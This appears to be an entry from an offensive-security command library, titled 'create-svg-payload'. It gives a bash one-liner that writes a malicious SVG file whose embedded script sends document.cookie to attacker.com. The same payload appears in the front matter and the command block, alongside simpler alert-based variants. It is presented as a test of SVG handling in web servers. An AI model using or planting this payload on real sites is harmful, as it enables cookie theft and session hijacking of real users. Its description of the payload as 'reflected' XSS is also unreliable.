---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS via
  SVG\')"><script>fetch(\'https://attacker.com/steal?cookie=\' +
  document.cookie);</script></svg>' > malicious.svg
tags:
  - xss
  - payload-generation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-13T23:55:20.983Z'
verified: false
validated: true
submitted: true
---
# create-svg-payload

## Command

```bash
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS via SVG\')"><script>fetch(\'https://attacker.com/steal?cookie=\' + document.cookie);</script></svg>' > malicious.svg
```

## Description

This command generates a malicious SVG file containing reflected XSS payload using JavaScript for execution upon loading, suitable for testing vulnerabilities in SVG handling on web servers like Autodesk AREA.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo` | Outputs the SVG content to stdout | Yes |
| `> malicious.svg` | Redirects output to a file | Yes |

## Examples

### Basic Usage

```bash
echo '<svg onload="alert(1)"></svg>' > test.svg
```

### Advanced Usage

```bash
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS via SVG\')"><script>console.log(document.domain);</script></svg>' > advanced.svg
```

## Expected Output

A file named malicious.svg is created in the current directory, containing the SVG with embedded JavaScript. When opened in a browser, it triggers an alert and attempts cookie exfiltration.

## Related

- [[Related Procedure|procedures/Inject-Malicious-JavaScript-into-SVG-File]]
